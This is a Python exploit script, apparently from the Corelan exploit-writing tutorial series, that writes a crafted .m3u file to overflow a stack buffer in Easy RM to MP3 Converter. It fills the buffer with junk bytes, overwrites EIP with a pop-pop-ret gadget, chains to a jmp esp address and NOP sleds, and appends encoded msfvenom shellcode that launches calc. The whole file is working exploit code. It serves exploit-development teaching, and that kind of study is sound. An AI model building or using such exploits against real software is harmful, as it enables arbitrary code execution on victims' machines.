#!/usr/bin/env python
import struct
# Popcalc for Easy RM to MP3 Converter
#
# Corelan Exploit Writing Tutorial 2
outfile = 'popcalc_exploit_pop_ret.m3u'

# Just some junk at the beginning
junk = '\x41' * 26050

#01AC6A10   58               POP EAX
#01AC6A11   5D               POP EBP
#01AC6A12   C3               RETN

eip = struct.pack("<L",0x01AC6A10) # overwrite EIP with pop pop ret

# 01CDF23A   FFE4             JMP ESP

jmpesp = struct.pack("<L",0x01CDF23A)

# Some junk so ESP points to shellcode
prependesp = 'CCCC'

shellcode = '\x90' * 8 #nop sled

shellcode = shellcode + jmpesp

shellcode = shellcode + '\x90' * 50 # nop sled

# msfvenom -p windows/exec CMD=calc -f python -e x86/alpha_upper 
shellcode = shellcode
shellcode += "\x89\xe7\xd9\xed\xd9\x77\xf4\x5a\x4a\x4a\x4a\x4a"
shellcode += "\x4a\x43\x43\x43\x43\x43\x43\x52\x59\x56\x54\x58"
shellcode += "\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48"
shellcode += "\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41"
shellcode += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50"
shellcode += "\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b\x58\x4c\x42"
shellcode += "\x33\x30\x35\x50\x53\x30\x55\x30\x4d\x59\x4b\x55"
shellcode += "\x46\x51\x39\x50\x43\x54\x4c\x4b\x56\x30\x50\x30"
shellcode += "\x4c\x4b\x46\x32\x44\x4c\x4c\x4b\x30\x52\x55\x44"
shellcode += "\x4c\x4b\x33\x42\x46\x48\x54\x4f\x48\x37\x51\x5a"
shellcode += "\x31\x36\x56\x51\x4b\x4f\x4e\x4c\x57\x4c\x35\x31"
shellcode += "\x33\x4c\x33\x32\x36\x4c\x57\x50\x59\x51\x58\x4f"
shellcode += "\x54\x4d\x53\x31\x59\x57\x4a\x42\x4a\x52\x31\x42"
shellcode += "\x50\x57\x4c\x4b\x36\x32\x52\x30\x4c\x4b\x50\x4a"
shellcode += "\x37\x4c\x4c\x4b\x30\x4c\x52\x31\x42\x58\x5a\x43"
shellcode += "\x50\x48\x43\x31\x38\x51\x50\x51\x4c\x4b\x31\x49"
shellcode += "\x31\x30\x53\x31\x39\x43\x4c\x4b\x30\x49\x35\x48"
shellcode += "\x5a\x43\x56\x5a\x50\x49\x4c\x4b\x37\x44\x4c\x4b"
shellcode += "\x45\x51\x49\x46\x30\x31\x4b\x4f\x4e\x4c\x49\x51"
shellcode += "\x58\x4f\x44\x4d\x45\x51\x58\x47\x47\x48\x4d\x30"
shellcode += "\x43\x45\x5a\x56\x35\x53\x53\x4d\x4a\x58\x37\x4b"
shellcode += "\x53\x4d\x31\x34\x32\x55\x5a\x44\x30\x58\x4c\x4b"
shellcode += "\x36\x38\x46\x44\x53\x31\x48\x53\x52\x46\x4c\x4b"
shellcode += "\x54\x4c\x50\x4b\x4c\x4b\x50\x58\x55\x4c\x43\x31"
shellcode += "\x38\x53\x4c\x4b\x35\x54\x4c\x4b\x33\x31\x4e\x30"
shellcode += "\x4b\x39\x47\x34\x46\x44\x51\x34\x31\x4b\x31\x4b"
shellcode += "\x33\x51\x51\x49\x31\x4a\x56\x31\x4b\x4f\x4b\x50"
shellcode += "\x31\x4f\x51\x4f\x31\x4a\x4c\x4b\x44\x52\x4a\x4b"
shellcode += "\x4c\x4d\x51\x4d\x52\x4a\x33\x31\x4c\x4d\x4b\x35"
shellcode += "\x48\x32\x55\x50\x55\x50\x53\x30\x36\x30\x43\x58"
shellcode += "\x36\x51\x4c\x4b\x42\x4f\x4c\x47\x4b\x4f\x38\x55"
shellcode += "\x4f\x4b\x5a\x50\x4f\x45\x49\x32\x31\x46\x33\x58"
shellcode += "\x4e\x46\x4a\x35\x4f\x4d\x4d\x4d\x4b\x4f\x49\x45"
shellcode += "\x47\x4c\x44\x46\x33\x4c\x45\x5a\x4b\x30\x4b\x4b"
shellcode += "\x4d\x30\x34\x35\x43\x35\x4f\x4b\x47\x37\x44\x53"
shellcode += "\x34\x32\x52\x4f\x32\x4a\x33\x30\x50\x53\x4b\x4f"
shellcode += "\x58\x55\x35\x33\x35\x31\x52\x4c\x43\x53\x45\x50"
shellcode += "\x41\x41"

payload = junk+eip+prependesp+shellcode
with open(outfile, 'w') as f:
	f.write(payload)
print "m3u File Created successfully\n"